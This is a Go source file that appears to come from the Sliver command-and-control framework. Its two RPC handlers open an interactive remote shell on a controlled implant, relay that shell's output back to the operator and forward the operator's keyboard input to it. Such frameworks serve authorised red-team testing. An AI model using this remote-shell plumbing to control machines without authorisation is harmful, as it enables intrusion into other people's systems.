package rpc

import (
	"log"
	clientpb "sliver/protobuf/client"
	"sliver/server/core"

	sliverpb "sliver/protobuf/sliver"

	"github.com/golang/protobuf/proto"
)

func rpcStartShell(req []byte, resp RPCResponse) {
	shellReq := &clientpb.ShellReq{}
	proto.Unmarshal(req, shellReq)
	sliver := (*core.Hive.Slivers)[int(shellReq.SliverID)]
	log.Printf("Opening shell channel with sliver %d", sliver.ID)

	// We need to re-use the envelope ID to handle the data
	// coming back from the sliver, so don't use sliver.Request()

	respCh := make(chan *sliverpb.Envelope)
	reqID := core.EnvelopeID()
	sliver.RespMutex.Lock()
	sliver.Resp[reqID] = respCh
	sliver.RespMutex.Unlock()
	defer func() {
		log.Printf("Cleanup shell response channel")
		sliver.RespMutex.Lock()
		defer sliver.RespMutex.Unlock()
		close(respCh)
		delete(sliver.Resp, reqID)
	}()
	sliver.Send <- &sliverpb.Envelope{
		ID:   reqID,
		Type: sliverpb.MsgShellReq,
	}
	for envelope := range respCh {
		shellData := &sliverpb.ShellData{}
		proto.Unmarshal(envelope.Data, shellData)
		log.Printf("[read] ShellID = %d) ...", shellData.ID)
		resp(envelope.Data, nil)
	}
}

func rpcShellData(req []byte, resp RPCResponse) {
	shellData := &sliverpb.ShellData{}
	proto.Unmarshal(req, shellData)
	sliver := (*core.Hive.Slivers)[int(shellData.SliverID)]
	log.Printf("[write] ShellID = %d, SliverID = %d", shellData.ID, shellData.SliverID)
	data, _ := proto.Marshal(&sliverpb.ShellData{
		ID:    shellData.ID,
		Stdin: shellData.Stdin,
	})
	sliver.Request(sliverpb.MsgShellData, defaultTimeout, data)
}
